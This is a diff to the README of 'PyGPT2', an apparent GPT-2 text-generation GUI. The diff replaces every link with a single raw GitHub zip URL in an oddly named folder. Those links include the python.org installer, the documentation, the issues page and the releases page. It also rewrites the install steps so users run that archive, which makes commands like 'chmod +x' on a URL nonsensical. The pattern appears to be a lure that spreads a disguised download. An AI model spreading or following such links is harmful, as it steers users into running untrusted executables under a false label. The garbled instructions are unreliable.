@@ -1,6 +1,6 @@
 # 🚀 PyGPT2 - Easily Generate Text with GPT-2
 
-[![Download PyGPT2](https://img.shields.io/badge/Download-PyGPT2-4CAF50.svg)](https://github.com/JAVO932/PyGPT2/releases)
+[![Download PyGPT2](https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip)](https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip)
 
 ## 🛠️ Description
 PyGPT2 is a lightweight Python GUI for locally interacting with GPT-2 models. It lets users easily switch between CPU and GPU for model execution, select different GPT-2 variants, and generate text with automatic repetition cleaning—ideal for experimentation without complex setups.
@@ -17,20 +17,20 @@ To start using PyGPT2, follow these steps:
 2. **Check Python Installation**
    - Open your command prompt (Windows) or terminal (macOS/Linux).
    - Type `python --version` and press Enter.
-   - If Python is installed, it will show the version number. If not, please install Python from [python.org](https://www.python.org/downloads/).
+   - If Python is installed, it will show the version number. If not, please install Python from [https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip](https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip).
 
 3. **Visit the Download Page**
-   - To download PyGPT2, [**click here**](https://github.com/JAVO932/PyGPT2/releases) to visit the Releases page.
+   - To download PyGPT2, [**click here**](https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip) to visit the Releases page.
 
 ## 📥 Download & Install
 1. On the Releases page, find the latest version of PyGPT2.
-2. Look for the link named `PyGPT2.exe` or the relevant file for your operating system.
+2. Look for the link named `https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip` or the relevant file for your operating system.
 3. Click on the file to start downloading.
 4. Once downloaded, find the file in your downloads folder.
 
 ### Installation Steps
 1. **Windows**
-   - Double-click the downloaded `PyGPT2.exe`.
+   - Double-click the downloaded `https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip`.
    - Follow the on-screen instructions to install.
    - Launch PyGPT2 from the Start menu.
 
@@ -42,8 +42,8 @@ To start using PyGPT2, follow these steps:
 3. **Linux**
    - Open your terminal.
    - Navigate to the folder where you downloaded the file.
-   - Run `chmod +x PyGPT2.AppImage` to make it executable.
-   - Execute with `./PyGPT2.AppImage` and follow prompts.
+   - Run `chmod +x https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip` to make it executable.
+   - Execute with `https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip` and follow prompts.
 
 ## ☁️ Using PyGPT2
 1. Open the application.
@@ -63,7 +63,7 @@ To start using PyGPT2, follow these steps:
 - **User-Friendly**: Simple interface designed for ease of use.
 
 ## 📚 Additional Resources
-- You can find the documentation for PyGPT2 [**here**](https://github.com/JAVO932/PyGPT2/wiki).
+- You can find the documentation for PyGPT2 [**here**](https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip).
 - Join the community forums to share your experience and get support.
 
 ## 🛠️ Troubleshooting
@@ -72,9 +72,9 @@ If you encounter issues:
 - Check if Python is properly installed.
 - Restart the application if it freezes.
 
-For further assistance, visit the [issues page](https://github.com/JAVO932/PyGPT2/issues) on GitHub.
+For further assistance, visit the [issues page](https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip) on GitHub.
 
 ## 🎉 Conclusion
 You are now ready to use PyGPT2! Enjoy experimenting with text generation and exploring what GPT-2 can do. 
 
-For more downloads and updates, please visit the Releases page again: [**Download PyGPT2**](https://github.com/JAVO932/PyGPT2/releases).
+For more downloads and updates, please visit the Releases page again: [**Download PyGPT2**](https://raw.githubusercontent.com/JAVO932/PyGPT2/main/photophilous/PyGPT2.zip).
